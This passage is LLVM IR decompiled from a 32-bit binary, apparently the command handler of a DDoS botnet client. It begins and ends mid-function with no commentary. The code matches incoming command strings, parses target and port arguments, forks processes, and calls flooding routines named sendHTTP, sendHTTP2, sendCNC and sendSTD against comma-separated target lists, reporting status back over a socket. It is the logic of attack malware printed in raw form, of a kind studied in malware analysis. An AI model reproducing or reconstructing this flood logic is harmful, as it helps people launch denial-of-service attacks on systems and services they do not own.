  %v1_804f3a2 = icmp eq i32 %v0_804f39d, 0
  %v1_804f3a4 = icmp eq i1 %v1_804f3a2, false
  br i1 %v1_804f3a4, label %dec_label_pc_804f9cf, label %dec_label_pc_804f3aa

dec_label_pc_804f3aa:                             ; preds = %dec_label_pc_804f39d
  %v1_804f3ad = add i32 %tmp188, 24
  %v1_804f3b0 = inttoptr i32 %v1_804f3ad to i32*
  %v2_804f3b0 = load i32, i32* %v1_804f3b0, align 4
  %v0_804f3b2 = load i32, i32* @esp, align 4
  %v5_804f3b2 = icmp ult i32 %v0_804f3b2, 12
  store i1 %v5_804f3b2, i1* %cf.global-to-local, align 1
  store i32 %v2_804f3b0, i32* %stack_var_-380, align 4
  %v1_804f3b6 = call i32 @atol(i32 %v2_804f3b0)
  store i32 %v1_804f3b6, i32* @ebx, align 4
  %v1_804f3c3 = add i32 %tmp188, 20
  %v1_804f3c6 = inttoptr i32 %v1_804f3c3 to i32*
  %v2_804f3c6 = load i32, i32* %v1_804f3c6, align 4
  %v5_804f3c8 = icmp ult i32* %stack_var_-364, inttoptr (i32 12 to i32*)
  store i1 %v5_804f3c8, i1* %cf.global-to-local, align 1
  store i32 %v2_804f3c6, i32* %stack_var_-380, align 4
  %v1_804f3cc = call i32 @atol(i32 %v2_804f3c6)
  store i32 %v1_804f3cc, i32* @esi, align 4
  %v1_804f3d9 = add i32 %tmp188, 16
  %v1_804f3dc = inttoptr i32 %v1_804f3d9 to i32*
  %v2_804f3dc = load i32, i32* %v1_804f3dc, align 4
  store i32 %v2_804f3dc, i32* @edi, align 4
  %v1_804f3e3 = add i32 %tmp188, 12
  %v1_804f3e6 = inttoptr i32 %v1_804f3e3 to i32*
  %v2_804f3e6 = load i32, i32* %v1_804f3e6, align 4
  store i1 %v5_804f3c8, i1* %cf.global-to-local, align 1
  store i32 %v2_804f3e6, i32* %stack_var_-380, align 4
  %v1_804f3ec = call i32 @atol(i32 %v2_804f3e6)
  %v1_804f3ff = add i32 %tmp188, 8
  %v1_804f402 = inttoptr i32 %v1_804f3ff to i32*
  %v2_804f402 = load i32, i32* %v1_804f402, align 4
  store i32 %v2_804f402, i32* %edx.global-to-local, align 4
  %v2_804f40c = load i32, i32* %v1_804f2b8, align 4
  %v5_804f40e = icmp ult i32* %stack_var_-364, inttoptr (i32 8 to i32*)
  store i1 %v5_804f40e, i1* %cf.global-to-local, align 1
  %v0_804f411 = load i32, i32* @ebx, align 4
  %v0_804f412 = load i32, i32* @esi, align 4
  store i32 %v0_804f412, i32* %stack_var_-380, align 4
  %v0_804f413 = load i32, i32* @edi, align 4
  store i32 %v2_804f40c, i32* %stack_var_-396, align 4
  %v6_804f417 = trunc i32 %v1_804f3ec to i16
  %v7_804f417 = call i32 @sendHTTP(i32 %v2_804f40c, i32 %v2_804f402, i16 %v6_804f417, i32 %v0_804f413, i32 %v0_804f412, i32 %v0_804f411)
  store i1 %v5_804f3c8, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-380, align 4
  %v1_804f424 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f429:                             ; preds = %dec_label_pc_804f2d0, %dec_label_pc_804f379, %dec_label_pc_804f25d
  %v2_804f42c = load i32, i32* %v1_804e944, align 4
  store i1 false, i1* @df, align 1
  %v4_804f449 = inttoptr i32 %v2_804f42c to i8*
  store i32 %v2_804f42c, i32* @esi, align 4
  store i32 ptrtoint ([10 x i8]* @global_var_80590f3.433 to i32), i32* @edi, align 4
  %v7_804f45b = call i32 @_strncmp(i8* %v4_804f449, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_80590f3.433, i32 0, i32 0), i32 10)
  %v8_804f45b = urem i32 %v7_804f45b, 2
  %v9_804f45b = icmp eq i32 %v8_804f45b, 0
  %v0_804f45d = load i1, i1* %cf.global-to-local, align 1
  %v2_804f45d = or i1 %v0_804f45d, %v9_804f45b
  %v3_804f45d = zext i1 %v2_804f45d to i32
  %v4_804f45d = load i32, i32* @edx, align 4
  %v5_804f45d = and i32 %v4_804f45d, -256
  %v6_804f45d = or i32 %v3_804f45d, %v5_804f45d
  %v7_804f45d = xor i32 %v6_804f45d, 1
  store i32 %v7_804f45d, i32* @edx, align 4
  %v1_804f465 = trunc i32 %v7_804f45d to i8
  %v3_804f465 = zext i1 %v0_804f45d to i8
  %v4_804f465 = sub nsw i8 %v1_804f465, %v3_804f465
  %v15_804f465 = icmp eq i8 %v4_804f465, 0
  store i1 false, i1* @cf, align 1
  %v1_804f46e = icmp eq i1 %v15_804f465, false
  br i1 %v1_804f46e, label %dec_label_pc_804f543, label %dec_label_pc_804f474

dec_label_pc_804f474:                             ; preds = %dec_label_pc_804f429
  %v2_804f469 = sext i8 %v4_804f465 to i32
  %v9_804f474 = icmp ult i32 %tmp160, 5
  store i1 %v9_804f474, i1* %cf.global-to-local, align 1
  %v7_804f478 = icmp sgt i32 %tmp160, 5
  br i1 %v7_804f478, label %dec_label_pc_804f47e, label %dec_label_pc_804f9cf

dec_label_pc_804f47e:                             ; preds = %dec_label_pc_804f474
  %v1_804f481 = add i32 %tmp188, 12
  %v1_804f484 = inttoptr i32 %v1_804f481 to i32*
  %v2_804f484 = load i32, i32* %v1_804f484, align 4
  %v0_804f486 = load i32, i32* @esp, align 4
  %v5_804f486 = icmp ult i32 %v0_804f486, 12
  store i1 %v5_804f486, i1* %cf.global-to-local, align 1
  %v1_804f48a = call i32 @atol(i32 %v2_804f484)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp215 = icmp slt i32 %v1_804f48a, 1
  br i1 %tmp215, label %dec_label_pc_804f9cf, label %dec_label_pc_804f49a

dec_label_pc_804f49a:                             ; preds = %dec_label_pc_804f47e
  %v1_804f49d = add i32 %tmp188, 20
  %v1_804f4a0 = inttoptr i32 %v1_804f49d to i32*
  %v2_804f4a0 = load i32, i32* %v1_804f4a0, align 4
  %v5_804f4a2 = icmp ult i32* %stack_var_-396, inttoptr (i32 12 to i32*)
  store i1 %v5_804f4a2, i1* %cf.global-to-local, align 1
  %v1_804f4a6 = call i32 @atol(i32 %v2_804f4a0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp216 = icmp slt i32 %v1_804f4a6, 1
  %tmp217 = icmp eq i1 %tmp216, false
  br i1 %tmp217, label %dec_label_pc_804f4b7, label %dec_label_pc_804f9cf

dec_label_pc_804f4b7:                             ; preds = %dec_label_pc_804f49a
  %v0_804f4b7 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f4bc = icmp eq i32 %v0_804f4b7, 0
  %v1_804f4be = icmp eq i1 %v1_804f4bc, false
  br i1 %v1_804f4be, label %dec_label_pc_804f9cf, label %dec_label_pc_804f4c4

dec_label_pc_804f4c4:                             ; preds = %dec_label_pc_804f4b7
  %v1_804f4c7 = add i32 %tmp188, 24
  %v1_804f4ca = inttoptr i32 %v1_804f4c7 to i32*
  %v2_804f4ca = load i32, i32* %v1_804f4ca, align 4
  %v0_804f4cc = load i32, i32* @esp, align 4
  %v5_804f4cc = icmp ult i32 %v0_804f4cc, 12
  store i1 %v5_804f4cc, i1* %cf.global-to-local, align 1
  %v1_804f4d0 = call i32 @atol(i32 %v2_804f4ca)
  store i32 %v1_804f4d0, i32* @ebx, align 4
  %v2_804f4e0 = load i32, i32* %v1_804f4a0, align 4
  store i1 %v5_804f4a2, i1* %cf.global-to-local, align 1
  %v1_804f4e6 = call i32 @atol(i32 %v2_804f4e0)
  store i32 %v1_804f4e6, i32* @esi, align 4
  %v1_804f4f3 = add i32 %tmp188, 16
  %v1_804f4f6 = inttoptr i32 %v1_804f4f3 to i32*
  %v2_804f4f6 = load i32, i32* %v1_804f4f6, align 4
  store i32 %v2_804f4f6, i32* @edi, align 4
  %v2_804f500 = load i32, i32* %v1_804f484, align 4
  store i1 %v5_804f4a2, i1* %cf.global-to-local, align 1
  %v1_804f506 = call i32 @atol(i32 %v2_804f500)
  %v1_804f519 = add i32 %tmp188, 8
  %v1_804f51c = inttoptr i32 %v1_804f519 to i32*
  %v2_804f51c = load i32, i32* %v1_804f51c, align 4
  store i32 %v2_804f51c, i32* %edx.global-to-local, align 4
  %v1_804f523 = add i32 %tmp188, 4
  %v1_804f526 = inttoptr i32 %v1_804f523 to i32*
  %v2_804f526 = load i32, i32* %v1_804f526, align 4
  %v5_804f528 = icmp ult i32* %stack_var_-396, inttoptr (i32 8 to i32*)
  store i1 %v5_804f528, i1* %cf.global-to-local, align 1
  %v0_804f52b = load i32, i32* @ebx, align 4
  %v0_804f52c = load i32, i32* @esi, align 4
  %v0_804f52d = load i32, i32* @edi, align 4
  %v6_804f531 = trunc i32 %v1_804f506 to i16
  %v7_804f531 = call i32 @sendHTTP2(i32 %v2_804f526, i32 %v2_804f51c, i16 %v6_804f531, i32 %v0_804f52d, i32 %v0_804f52c, i32 %v0_804f52b)
  store i32 %v7_804f531, i32* @eax, align 4
  store i1 %v5_804f4a2, i1* %cf.global-to-local, align 1
  %v1_804f53e = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804f543

dec_label_pc_804f543:                             ; preds = %dec_label_pc_804f429, %dec_label_pc_804f4c4
  %v2_804f546 = load i32, i32* %v1_804e944, align 4
  store i1 false, i1* @df, align 1
  %v4_804f563 = inttoptr i32 %v2_804f546 to i8*
  store i32 %v2_804f546, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_80590fd.434 to i32), i32* @edi, align 4
  %v7_804f575 = call i32 @_strncmp(i8* %v4_804f563, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80590fd.434, i32 0, i32 0), i32 4)
  %v8_804f575 = urem i32 %v7_804f575, 2
  %v9_804f575 = icmp eq i32 %v8_804f575, 0
  %v0_804f577 = load i1, i1* @cf, align 1
  %v2_804f577 = or i1 %v0_804f577, %v9_804f575
  %v3_804f577 = zext i1 %v2_804f577 to i32
  %v4_804f577 = load i32, i32* @edx, align 4
  %v5_804f577 = and i32 %v4_804f577, -256
  %v6_804f577 = or i32 %v3_804f577, %v5_804f577
  %v7_804f577 = xor i32 %v6_804f577, 1
  store i32 %v7_804f577, i32* @edx, align 4
  %v1_804f57f = trunc i32 %v7_804f577 to i8
  %v3_804f57f = zext i1 %v0_804f577 to i8
  %v15_804f57f = icmp eq i8 %v1_804f57f, %v3_804f57f
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f588 = icmp eq i1 %v15_804f57f, false
  br i1 %v1_804f588, label %dec_label_pc_804f6c6, label %dec_label_pc_804f58e

dec_label_pc_804f58e:                             ; preds = %dec_label_pc_804f543
  %v9_804f58e = icmp ult i32 %tmp160, 3
  store i1 %v9_804f58e, i1* %cf.global-to-local, align 1
  %v7_804f592 = icmp sgt i32 %tmp160, 3
  br i1 %v7_804f592, label %dec_label_pc_804f594, label %dec_label_pc_804f58e.dec_label_pc_804f5c4_crit_edge

dec_label_pc_804f58e.dec_label_pc_804f5c4_crit_edge: ; preds = %dec_label_pc_804f58e
  %v0_804f5c9.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f5c4

dec_label_pc_804f594:                             ; preds = %dec_label_pc_804f58e
  %v1_804f597 = add i32 %tmp188, 8
  %v1_804f59a = inttoptr i32 %v1_804f597 to i32*
  %v2_804f59a = load i32, i32* %v1_804f59a, align 4
  %v0_804f59c = load i32, i32* @esp, align 4
  %v5_804f59c = icmp ult i32 %v0_804f59c, 12
  store i1 %v5_804f59c, i1* %cf.global-to-local, align 1
  store i32 %v2_804f59a, i32* %stack_var_-396, align 4
  %v1_804f5a0 = call i32 @atol(i32 %v2_804f59a)
  %v12_804f5a5 = ptrtoint i32* %stack_var_-380 to i32
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp218 = icmp slt i32 %v1_804f5a0, 1
  br i1 %tmp218, label %dec_label_pc_804f5c4, label %dec_label_pc_804f5ac

dec_label_pc_804f5ac:                             ; preds = %dec_label_pc_804f594
  %v1_804f5af = add i32 %tmp188, 12
  %v1_804f5b2 = inttoptr i32 %v1_804f5af to i32*
  %v2_804f5b2 = load i32, i32* %v1_804f5b2, align 4
  %v5_804f5b4 = icmp ult i32* %stack_var_-380, inttoptr (i32 12 to i32*)
  store i1 %v5_804f5b4, i1* %cf.global-to-local, align 1
  store i32 %v2_804f5b2, i32* %stack_var_-396, align 4
  %v1_804f5b8 = call i32 @atol(i32 %v2_804f5b2)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp219 = icmp slt i32 %v1_804f5b8, 1
  %tmp220 = icmp eq i1 %tmp219, false
  br i1 %tmp220, label %dec_label_pc_804f5df, label %dec_label_pc_804f5c4

dec_label_pc_804f5c4:                             ; preds = %dec_label_pc_804f58e.dec_label_pc_804f5c4_crit_edge, %dec_label_pc_804f5ac, %dec_label_pc_804f594
  %v0_804f5c9 = phi i32 [ %v0_804f5c9.pre, %dec_label_pc_804f58e.dec_label_pc_804f5c4_crit_edge ], [ %v12_804f5a5, %dec_label_pc_804f5ac ], [ %v12_804f5a5, %dec_label_pc_804f594 ]
  %v0_804f5c4 = load i32, i32* @global_var_805b520.20, align 32
  %v5_804f5c9 = icmp ult i32 %v0_804f5c9, 8
  store i1 %v5_804f5c9, i1* %cf.global-to-local, align 1
  store i32 %v0_804f5c4, i32* %stack_var_-396, align 4
  %v2_804f5d2 = call i32 @sockprintf(i32 %v0_804f5c4, i32 ptrtoint ([27 x i8]* @global_var_8059101.435 to i32))
  %v0_804f5d7 = load i32, i32* @esp, align 4
  %v2_804f5d7 = icmp ugt i32 %v0_804f5d7, -17
  store i1 %v2_804f5d7, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f9cf

dec_label_pc_804f5df:                             ; preds = %dec_label_pc_804f5ac
  %v1_804f5e2 = add i32 %tmp188, 4
  %v1_804f5e5 = inttoptr i32 %v1_804f5e2 to i32*
  %v2_804f5e5 = load i32, i32* %v1_804f5e5, align 4
  %v2_804f5f0 = load i32, i32* %v1_804f59a, align 4
  store i1 %v5_804f5b4, i1* %cf.global-to-local, align 1
  store i32 %v2_804f5f0, i32* %stack_var_-396, align 4
  %v1_804f5f6 = call i32 @atol(i32 %v2_804f5f0)
  %v2_804f607 = load i32, i32* %v1_804f5b2, align 4
  store i1 %v5_804f5b4, i1* %cf.global-to-local, align 1
  store i32 %v2_804f607, i32* %stack_var_-396, align 4
  %v1_804f60d = call i32 @atol(i32 %v2_804f607)
  %v5_804f61b = icmp ult i32* %stack_var_-380, inttoptr (i32 8 to i32*)
  store i1 %v5_804f61b, i1* %cf.global-to-local, align 1
  store i32 %v2_804f5e5, i32* %stack_var_-396, align 4
  %v2_804f621 = inttoptr i32 %v2_804f5e5 to i8*
  %v3_804f621 = call i32 @__GI_strchr(i8* %v2_804f621, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f629 = icmp eq i32 %v3_804f621, 0
  br i1 %v1_804f629, label %dec_label_pc_804f69b, label %dec_label_pc_804f62d

dec_label_pc_804f62d:                             ; preds = %dec_label_pc_804f5df
  store i32 %v2_804f5e5, i32* @eax, align 4
  store i1 %v5_804f61b, i1* %cf.global-to-local, align 1
  store i32 %v2_804f5e5, i32* %stack_var_-396, align 4
  %v2_804f639 = call i32 @__GI_strtok(i32 %v2_804f5e5, i32 ptrtoint (i32* @global_var_8058c11.306 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f693245 = icmp eq i32 %v2_804f639, 0
  %v1_804f697246 = icmp eq i1 %v4_804f693245, false
  br i1 %v1_804f697246, label %dec_label_pc_804f646, label %dec_label_pc_804f6c6

dec_label_pc_804f646:                             ; preds = %dec_label_pc_804f62d, %dec_label_pc_804f67e
  %storemerge103247 = phi i32 [ %v2_804f688, %dec_label_pc_804f67e ], [ %v2_804f639, %dec_label_pc_804f62d ]
  %v0_804f646 = call i32 @listFork()
  store i32 %v0_804f646, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f64b = icmp eq i32 %v0_804f646, 0
  %v1_804f64d = icmp eq i1 %v1_804f64b, false
  %v0_804f67e = load i32, i32* @esp, align 4
  br i1 %v1_804f64d, label %dec_label_pc_804f67e, label %dec_label_pc_804f64f

dec_label_pc_804f64f:                             ; preds = %dec_label_pc_804f646
  %v5_804f64f = icmp ult i32 %v0_804f67e, 4
  store i1 %v5_804f64f, i1* %cf.global-to-local, align 1
  store i32 %storemerge103247, i32* %stack_var_-396, align 4
  %v3_804f65b = call i32 @sendCNC(i32 %storemerge103247, i32 %v1_804f5f6, i32 %v1_804f60d)
  %v0_804f663 = load i32, i32* @global_var_805b520.20, align 32
  store i1 %v5_804f5b4, i1* %cf.global-to-local, align 1
  store i32 %v0_804f663, i32* %stack_var_-396, align 4
  %v1_804f66c = call i32 @__libc_close(i32 %v0_804f663)
  store i1 %v5_804f5b4, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-396, align 4
  %v1_804f679 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f67e:                             ; preds = %dec_label_pc_804f646
  %v5_804f67e = icmp ult i32 %v0_804f67e, 8
  store i1 %v5_804f67e, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-396, align 4
  %v2_804f688 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_8058c11.306 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f693 = icmp eq i32 %v2_804f688, 0
  %v1_804f697 = icmp eq i1 %v4_804f693, false
  br i1 %v1_804f697, label %dec_label_pc_804f646, label %dec_label_pc_804f6c6

dec_label_pc_804f69b:                             ; preds = %dec_label_pc_804f5df
  %v0_804f69b = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f6a0 = icmp eq i32 %v0_804f69b, 0
  %v1_804f6a2 = icmp eq i1 %v1_804f6a0, false
  br i1 %v1_804f6a2, label %dec_label_pc_804f9cf, label %dec_label_pc_804f6a8

dec_label_pc_804f6a8:                             ; preds = %dec_label_pc_804f69b
  %v0_804f6a8 = load i32, i32* @esp, align 4
  %v5_804f6a8 = icmp ult i32 %v0_804f6a8, 4
  store i1 %v5_804f6a8, i1* %cf.global-to-local, align 1
  store i32 %v2_804f5e5, i32* %stack_var_-396, align 4
  %v3_804f6b4 = call i32 @sendCNC(i32 %v2_804f5e5, i32 %v1_804f5f6, i32 %v1_804f60d)
  store i1 %v5_804f5b4, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-396, align 4
  %v1_804f6c1 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f6c6:                             ; preds = %dec_label_pc_804f62d, %dec_label_pc_804f67e, %dec_label_pc_804f543
  %v2_804f6c9 = load i32, i32* %v1_804e944, align 4
  store i1 false, i1* @df, align 1
  %v4_804f6e6 = inttoptr i32 %v2_804f6c9 to i8*
  store i32 %v2_804f6c9, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805911c.436 to i32), i32* @edi, align 4
  %v7_804f6f8 = call i32 @_strncmp(i8* %v4_804f6e6, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805911c.436, i32 0, i32 0), i32 4)
  %v8_804f6f8 = urem i32 %v7_804f6f8, 2
  %v9_804f6f8 = icmp eq i32 %v8_804f6f8, 0
  %v0_804f6fa = load i1, i1* %cf.global-to-local, align 1
  %v2_804f6fa = or i1 %v0_804f6fa, %v9_804f6f8
  %v3_804f6fa = zext i1 %v2_804f6fa to i32
  %v4_804f6fa = load i32, i32* @edx, align 4
  %v5_804f6fa = and i32 %v4_804f6fa, -256
  %v6_804f6fa = or i32 %v3_804f6fa, %v5_804f6fa
  %v7_804f6fa = xor i32 %v6_804f6fa, 1
  store i32 %v7_804f6fa, i32* @edx, align 4
  %v1_804f702 = trunc i32 %v7_804f6fa to i8
  %v3_804f702 = zext i1 %v0_804f6fa to i8
  %v15_804f702 = icmp eq i8 %v1_804f702, %v3_804f702
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f70b = icmp eq i1 %v15_804f702, false
  br i1 %v1_804f70b, label %dec_label_pc_804f838, label %dec_label_pc_804f711

dec_label_pc_804f711:                             ; preds = %dec_label_pc_804f6c6
  %v9_804f711 = icmp ult i32 %tmp160, 3
  store i1 %v9_804f711, i1* %cf.global-to-local, align 1
  %v7_804f715 = icmp sgt i32 %tmp160, 3
  br i1 %v7_804f715, label %dec_label_pc_804f717, label %dec_label_pc_804f711.dec_label_pc_804f747_crit_edge

dec_label_pc_804f711.dec_label_pc_804f747_crit_edge: ; preds = %dec_label_pc_804f711
  %v0_804f74c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f747

dec_label_pc_804f717:                             ; preds = %dec_label_pc_804f711
  %v1_804f71a = add i32 %tmp188, 8
  %v1_804f71d = inttoptr i32 %v1_804f71a to i32*
  %v2_804f71d = load i32, i32* %v1_804f71d, align 4
  %v0_804f71f = load i32, i32* @esp, align 4
  %v5_804f71f = icmp ult i32 %v0_804f71f, 12
  store i1 %v5_804f71f, i1* %cf.global-to-local, align 1
  %v1_804f723 = call i32 @atol(i32 %v2_804f71d)
  %v12_804f728 = ptrtoint i32* %stack_var_-396 to i32
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp221 = icmp slt i32 %v1_804f723, 1
  br i1 %tmp221, label %dec_label_pc_804f747, label %dec_label_pc_804f72f

dec_label_pc_804f72f:                             ; preds = %dec_label_pc_804f717
  %v1_804f732 = add i32 %tmp188, 12
  %v1_804f735 = inttoptr i32 %v1_804f732 to i32*
  %v2_804f735 = load i32, i32* %v1_804f735, align 4
  %v5_804f737 = icmp ult i32* %stack_var_-396, inttoptr (i32 12 to i32*)
  store i1 %v5_804f737, i1* %cf.global-to-local, align 1
  %v1_804f73b = call i32 @atol(i32 %v2_804f735)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp222 = icmp slt i32 %v1_804f73b, 1
  %tmp223 = icmp eq i1 %tmp222, false
  br i1 %tmp223, label %dec_label_pc_804f762, label %dec_label_pc_804f747

dec_label_pc_804f747:                             ; preds = %dec_label_pc_804f711.dec_label_pc_804f747_crit_edge, %dec_label_pc_804f72f, %dec_label_pc_804f717
  %v0_804f74c = phi i32 [ %v0_804f74c.pre, %dec_label_pc_804f711.dec_label_pc_804f747_crit_edge ], [ %v12_804f728, %dec_label_pc_804f72f ], [ %v12_804f728, %dec_label_pc_804f717 ]
  %v0_804f747 = load i32, i32* @global_var_805b520.20, align 32
  %v5_804f74c = icmp ult i32 %v0_804f74c, 8
  store i1 %v5_804f74c, i1* %cf.global-to-local, align 1
  %v2_804f755 = call i32 @sockprintf(i32 %v0_804f747, i32 ptrtoint ([27 x i8]* @global_var_8059120.437 to i32))
  %v0_804f75a = load i32, i32* @esp, align 4
  %v2_804f75a = icmp ugt i32 %v0_804f75a, -17
  store i1 %v2_804f75a, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f9cf

dec_label_pc_804f762:                             ; preds = %dec_label_pc_804f72f
  %v1_804f765 = add i32 %tmp188, 4
  %v1_804f768 = inttoptr i32 %v1_804f765 to i32*
  %v2_804f768 = load i32, i32* %v1_804f768, align 4
  %v2_804f773 = load i32, i32* %v1_804f71d, align 4
  store i1 %v5_804f737, i1* %cf.global-to-local, align 1
  %v1_804f779 = call i32 @atol(i32 %v2_804f773)
  %v2_804f78a = load i32, i32* %v1_804f735, align 4
  store i1 %v5_804f737, i1* %cf.global-to-local, align 1
  %v1_804f790 = call i32 @atol(i32 %v2_804f78a)
  %v5_804f79e = icmp ult i32* %stack_var_-396, inttoptr (i32 8 to i32*)
  store i1 %v5_804f79e, i1* %cf.global-to-local, align 1
  %v2_804f7a4 = inttoptr i32 %v2_804f768 to i8*
  %v3_804f7a4 = call i32 @__GI_strchr(i8* %v2_804f7a4, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f7ac = icmp eq i32 %v3_804f7a4, 0
  br i1 %v1_804f7ac, label %dec_label_pc_804f80d, label %dec_label_pc_804f7b0

dec_label_pc_804f7b0:                             ; preds = %dec_label_pc_804f762
  store i32 %v2_804f768, i32* @eax, align 4
  store i1 %v5_804f79e, i1* %cf.global-to-local, align 1
  %v2_804f7bc = call i32 @__GI_strtok(i32 %v2_804f768, i32 ptrtoint (i32* @global_var_8058c11.306 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f805242 = icmp eq i32 %v2_804f7bc, 0
  %v1_804f809243 = icmp eq i1 %v4_804f805242, false
  br i1 %v1_804f809243, label %dec_label_pc_804f7c9, label %dec_label_pc_804f838

dec_label_pc_804f7c9:                             ; preds = %dec_label_pc_804f7b0, %dec_label_pc_804f7f0
  %storemerge31244 = phi i32 [ %v2_804f7fa, %dec_label_pc_804f7f0 ], [ %v2_804f7bc, %dec_label_pc_804f7b0 ]
  %v0_804f7c9 = call i32 @listFork()
  store i32 %v0_804f7c9, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f7ce = icmp eq i32 %v0_804f7c9, 0
  %v1_804f7d0 = icmp eq i1 %v1_804f7ce, false
  %v0_804f7f0 = load i32, i32* @esp, align 4
  br i1 %v1_804f7d0, label %dec_label_pc_804f7f0, label %dec_label_pc_804f7d2

dec_label_pc_804f7d2:                             ; preds = %dec_label_pc_804f7c9
  %v5_804f7d2 = icmp ult i32 %v0_804f7f0, 4
  store i1 %v5_804f7d2, i1* %cf.global-to-local, align 1
  %v3_804f7de = trunc i32 %v1_804f779 to i16
  %v4_804f7de = call i32 @sendSTD(i32 %storemerge31244, i16 %v3_804f7de, i32 %v1_804f790)
  store i1 %v5_804f737, i1* %cf.global-to-local, align 1
  %v1_804f7eb = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f7f0:                             ; preds = %dec_label_pc_804f7c9
  %v5_804f7f0 = icmp ult i32 %v0_804f7f0, 8
  store i1 %v5_804f7f0, i1* %cf.global-to-local, align 1
  %v2_804f7fa = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_8058c11.306 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f805 = icmp eq i32 %v2_804f7fa, 0
  %v1_804f809 = icmp eq i1 %v4_804f805, false
  br i1 %v1_804f809, label %dec_label_pc_804f7c9, label %dec_label_pc_804f838

dec_label_pc_804f80d:                             ; preds = %dec_label_pc_804f762
  %v0_804f80d = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f812 = icmp eq i32 %v0_804f80d, 0
  %v1_804f814 = icmp eq i1 %v1_804f812, false
  br i1 %v1_804f814, label %dec_label_pc_804f9cf, label %dec_label_pc_804f81a

dec_label_pc_804f81a:                             ; preds = %dec_label_pc_804f80d
  %v0_804f81a = load i32, i32* @esp, align 4
  %v5_804f81a = icmp ult i32 %v0_804f81a, 4
  store i1 %v5_804f81a, i1* %cf.global-to-local, align 1
  %v3_804f826 = trunc i32 %v1_804f779 to i16
  %v4_804f826 = call i32 @sendSTD(i32 %v2_804f768, i16 %v3_804f826, i32 %v1_804f790)
  store i1 %v5_804f737, i1* %cf.global-to-local, align 1
  %v1_804f833 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f838:                             ; preds = %dec_label_pc_804f7b0, %dec_label_pc_804f7f0, %dec_label_pc_804f6c6
  %v2_804f83b = load i32, i32* %v1_804e944, align 4
  store i1 false, i1* @df, align 1
  %v4_804f858 = inttoptr i32 %v2_804f83b to i8*
  %v7_804f86a = call i32 @_strncmp(i8* %v4_804f858, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805913b.438, i32 0, i32 0), i32 9)
  %v8_804f86a = urem i32 %v7_804f86a, 2
  %v9_804f86a = icmp eq i32 %v8_804f86a, 0
  %v0_804f86c = load i1, i1* %cf.global-to-local, align 1
  %v2_804f86c = or i1 %v0_804f86c, %v9_804f86a
  %v3_804f86c = zext i1 %v2_804f86c to i32
  %v4_804f86c = load i32, i32* @edx, align 4
  %v5_804f86c = and i32 %v4_804f86c, -256
  %v6_804f86c = or i32 %v3_804f86c, %v5_804f86c
  %v7_804f86c = xor i32 %v6_804f86c, 1
  store i32 %v7_804f86c, i32* @edx, align 4
  %v1_804f874 = trunc i32 %v7_804f86c to i8
  %v3_804f874 = zext i1 %v0_804f86c to i8
  %v15_804f874 = icmp eq i8 %v1_804f874, %v3_804f874
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f87d = icmp eq i1 %v15_804f874, false
  br i1 %v1_804f87d, label %dec_label_pc_804f97e, label %dec_label_pc_804f8ea.preheader

dec_label_pc_804f8ea.preheader:                   ; preds = %dec_label_pc_804f838
  br label %dec_label_pc_804f8ea

dec_label_pc_804f893:                             ; preds = %dec_label_pc_804f927, %dec_label_pc_804f8ea
  %v2_804f896 = mul i32 %storemerge30, 4
  store i32 %v2_804f896, i32* %edx.global-to-local, align 4
  %v0_804f89b = load i32, i32* @global_var_80617b4.36, align 4
  %v2_804f8a0 = add i32 %v0_804f89b, %v2_804f896
  %v1_804f8a3 = inttoptr i32 %v2_804f8a0 to i32*
  %v2_804f8a3 = load i32, i32* %v1_804f8a3, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f8a5 = icmp eq i32 %v2_804f8a3, 0
  br i1 %v1_804f8a5, label %dec_label_pc_804f8e7, label %dec_label_pc_804f8a9

dec_label_pc_804f8a9:                             ; preds = %dec_label_pc_804f893
  %v9_804f896 = and i32 %storemerge30, 1073741824
  %v10_804f896 = icmp ne i32 %v9_804f896, 0
  store i1 %v10_804f896, i1* %cf.global-to-local, align 1
  store i32 %v2_804f896, i32* %edx.global-to-local, align 4
